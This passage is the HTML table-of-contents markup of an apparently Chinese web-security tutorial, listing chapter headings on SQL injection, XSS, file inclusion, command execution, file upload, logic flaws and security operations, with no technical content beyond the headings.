href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-Web%E5%AE%89%E5%85%A8%E7%BB%BC%E8%BF%B0"><span class="toc-text">第一部分 Web安全综述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-HTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80"><span class="toc-text">第二部分 HTTP协议基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第三部分 SQL注入漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-1-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80"><span class="toc-text">4.3.1 数据库基础</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E8%BF%B0"><span class="toc-text">数据库概述</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BB%E6%B5%81%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-text">主流数据库管理系统</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9B%BD%E5%86%85%E8%87%AA%E4%B8%BB%E7%A0%94%E5%8F%91%E7%9A%84%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">国内自主研发的关系型数据库</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">MYSQL数据库连接方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%86%E5%88%AB%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">识别数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%B1%BB%E5%88%AB"><span class="toc-text">类别</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95"><span class="toc-text">方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E8%AF%AD%E5%8F%A5%E5%9F%BA%E7%A1%80"><span class="toc-text">SQL语句基础</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-2-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">4.3.2 SQL注入漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0"><span class="toc-text">SQL注入概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-text">SQL注入分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BD%A2%E6%88%90%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">SQL注入漏洞形成的原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BB%E6%89%BESQL%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">寻找SQL注入点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-text">SQL注入的过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-3-SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">4.3.3 SQL报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0"><span class="toc-text">SQL报错注入概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BE%8B"><span class="toc-text">SQL报错注入实例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-4-SQL%E7%9B%B2%E6%B3%A8"><span class="toc-text">4.3.4 SQL盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E7%9B%B2%E6%B3%A8%E6%A6%82%E8%BF%B0"><span class="toc-text">SQL盲注概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E7%9B%B2%E6%B3%A8%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">SQL盲注常用函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E7%9B%B2%E6%B3%A8%E5%AE%9E%E4%BE%8B"><span class="toc-text">SQL盲注实例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-5-HTTP%E6%96%87%E4%BB%B6%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">4.3.5 HTTP文件头注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTP-Header%E6%A6%82%E8%BF%B0"><span class="toc-text">HTTP Header概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTP-Header%E6%B3%A8%E5%85%A5"><span class="toc-text">HTTP Header注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Cookie%E6%B3%A8%E5%85%A5"><span class="toc-text">Cookie注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Referer%E6%B3%A8%E5%85%A5"><span class="toc-text">Referer注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#User-Agent%E6%B3%A8%E5%85%A5"><span class="toc-text">User-Agent注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#XFF%E6%B3%A8%E5%85%A5"><span class="toc-text">XFF注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-6-SQLMAP%E5%9F%BA%E7%A1%80"><span class="toc-text">4.3.6 SQLMAP基础</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLMAP%E7%AE%80%E4%BB%8B"><span class="toc-text">SQLMAP简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLMAP%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">SQLMAP基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#u%E5%8F%82%E6%95%B0%EF%BC%88GET%EF%BC%89"><span class="toc-text">-u参数（GET）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#r%E5%8F%82%E6%95%B0%EF%BC%88POST%EF%BC%89"><span class="toc-text">-r参数（POST）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#m%E5%8F%82%E6%95%B0%EF%BC%88%E5%A4%9A%E4%B8%AAURL%EF%BC%89"><span class="toc-text">-m参数（多个URL）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86-XSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第四部分 XSS漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-1-%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86"><span class="toc-text">4.4.1 会话管理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-text">Web会话管理概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%96%B9%E5%BC%8F"><span class="toc-text">Web会话管理方式</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Eserver%E7%AB%AFsession%E7%9A%84%E7%AE%A1%E7%90%86%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-text">基于server端session的管理的方式</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#cookie-based%E7%9A%84%E7%AE%A1%E7%90%86%E6%96%B9%E5%BC%8F"><span class="toc-text">cookie-based的管理方式</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#token-based%E7%9A%84%E7%AE%A1%E7%90%86%E6%96%B9%E5%BC%8F"><span class="toc-text">token-based的管理方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-text">Web会话管理安全问题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-2-Session%E6%94%BB%E5%87%BB"><span class="toc-text">4.4.2 Session攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Session%E6%94%BB%E5%87%BB%E7%AE%80%E4%BB%8B"><span class="toc-text">Session攻击简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E9%A2%84%E6%B5%8B"><span class="toc-text">会话预测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="toc-text">会话劫持</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A"><span class="toc-text">会话固定</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-3-Cookie%E5%AE%89%E5%85%A8"><span class="toc-text">4.4.3 Cookie安全</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E6%9C%BA%E5%88%B6"><span class="toc-text">Cookie机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E5%AD%98%E5%82%A8"><span class="toc-text">Cookie存储</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-4-HTTP%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8"><span class="toc-text">4.4.4 HTTP协议安全</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Weak-Session-lDs-%E5%BC%B1%E4%BC%9A%E8%AF%9DIDs"><span class="toc-text">Weak Session lDs(弱会话IDs)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTP%E5%8D%8F%E8%AE%AE%E5%AD%98%E5%9C%A8%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-text">HTTP协议存在的安全问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTPS%E5%8D%8F%E8%AE%AE"><span class="toc-text">HTTPS协议</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-5-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E2%80%93XSS%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">4.4.5 XSS跨站脚本攻击–XSS漏洞概述</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">XSS漏洞概述</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-6-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E2%80%93XSS%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="toc-text">4.4.6 XSS跨站脚本攻击–XSS漏洞分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-text">DOM型XSS</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-7-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E2%80%93Payload%E6%9E%84%E9%80%A0%E5%8F%8A%E5%8F%98%E5%BD%A2"><span class="toc-text">4.4.7 XSS跨站脚本攻击–Payload构造及变形</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-8-Cookie%E6%94%BB%E5%87%BB"><span class="toc-text">4.4.8 Cookie攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E5%9F%BA%E7%A1%80"><span class="toc-text">Cookie基础</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E6%94%BB%E5%87%BB"><span class="toc-text">Cookie攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB"><span class="toc-text">XSS钓鱼攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-9-XSS-Worm"><span class="toc-text">4.4.9 XSS Worm</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS-Worm%E4%BB%8B%E7%BB%8D"><span class="toc-text">XSS Worm介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS-Worm%E5%89%96%E6%9E%90"><span class="toc-text">XSS Worm剖析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A0%95%E8%99%AB%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B"><span class="toc-text">蠕虫攻击实例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-10-XSS%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1"><span class="toc-text">4.4.10 XSS攻击防御</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS-Filter"><span class="toc-text">XSS Filter</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%96%B9%E6%B3%95"><span class="toc-text">过滤方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83"><span class="toc-text">Web安全编码规范</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-11-XSS%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">4.4.11 XSS相关工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E5%B7%A5%E5%85%B7"><span class="toc-text">XSS工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0"><span class="toc-text">XSS测试平台</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">XSS漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第五部分 文件包含漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">4.5 文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">PHP文件包含</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">文件包含漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93"><span class="toc-text">伪协议用法小结</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E9%83%A8%E5%88%86-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第六部分 命令执行漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6-1-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">4.6.1 命令执行漏洞概述</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AE%9A%E4%B9%89"><span class="toc-text">命令执行定义</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-text">命令执行的条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%88%90%E5%9B%A0"><span class="toc-text">命令执行成因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8D%B1%E5%AE%B3"><span class="toc-text">命令执行危害</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AE%9E%E4%BE%8B"><span class="toc-text">命令执行实例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6%E5%8F%B7%E5%92%8C%E9%80%9A%E7%94%A8%E5%91%BD%E4%BB%A4%E7%AC%A6"><span class="toc-text">管道符号和通用命令符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF"><span class="toc-text">命令执行常见场景</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6-2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">4.6.2 远程命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">远程命令执行漏洞相关函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">远程命令执行漏洞的利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6-3-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">4.6.3 系统命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6-4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%98%B2%E5%BE%A1"><span class="toc-text">4.6.4 命令执行漏洞及防御</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EDVWA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">基于DVWA的命令执行漏洞分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">命令执行漏洞防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E9%83%A8%E5%88%86-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第七部分 文件上传漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-1%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">4.7.1文件上传漏洞概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-text">4.7.2文件上传检测与绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-3-Web%E5%AE%B9%E5%99%A8%E5%8F%8AIIS"><span class="toc-text">4.7.3 Web容器及IIS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-4-Apache%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">4.7.4  Apache文件解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-5-Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">4.7.5 Nginx解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-6-Tomcat%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">4.7.6 Tomcat任意文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-7-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%98%B2%E5%BE%A1"><span class="toc-text">4.7.7 文件上传防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E9%83%A8%E5%88%86-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第八部分 逻辑漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8-1-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">4.8.1 逻辑漏洞概述</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A6%82%E8%BF%B0"><span class="toc-text">访问控制概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">逻辑漏洞概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="toc-text">验证机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86"><span class="toc-text">会话管理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6"><span class="toc-text">权限控制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91"><span class="toc-text">业务逻辑</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8-2-%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6%E9%97%AE%E9%A2%98"><span class="toc-text">4.8.2 验证机制问题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6-1"><span class="toc-text">验证机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7"><span class="toc-text">验证机制设计缺陷</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6%E6%89%A7%E8%A1%8C%E7%BC%BA%E9%99%B7"><span class="toc-text">验证机制执行缺陷</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8-3-%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E9%97%AE%E9%A2%98"><span class="toc-text">4.8.3 会话管理问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8-4-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E9%97%AE%E9%A2%98"><span class="toc-text">4.8.4 权限控制问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8-5-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E9%97%AE%E9%A2%98"><span class="toc-text">4.8.5 业务逻辑问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5"><span class="toc-text">第五章 网络安全运营</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%A6%82%E8%BF%B0"><span class="toc-text">第一部分 网络安全运营概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5"><span class="toc-text">5.1.1 什么是安全运营</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E8%83%8C%E6%99%AF"><span class="toc-text">安全运营背景</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E5%92%8C%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%B8%AD%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="toc-text">安全运营和安全运营中心概念</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E7%9B%AE%E6%A0%87"><span class="toc-text">安全运营目标</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5"><span class="toc-text">如何实现安全运营</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-2-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%BA%A7%E5%93%81%E4%B8%8E%E6%A8%A1%E5%BC%8F"><span class="toc-text">5.1.2 安全运营产品与模式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-3-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84"><span class="toc-text">5.1.3 安全运营技术架构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-4-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%B5%81%E7%A8%8B"><span class="toc-text">5.1.4 安全运营流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%9C%8D%E5%8A%A1"><span class="toc-text">第二部分 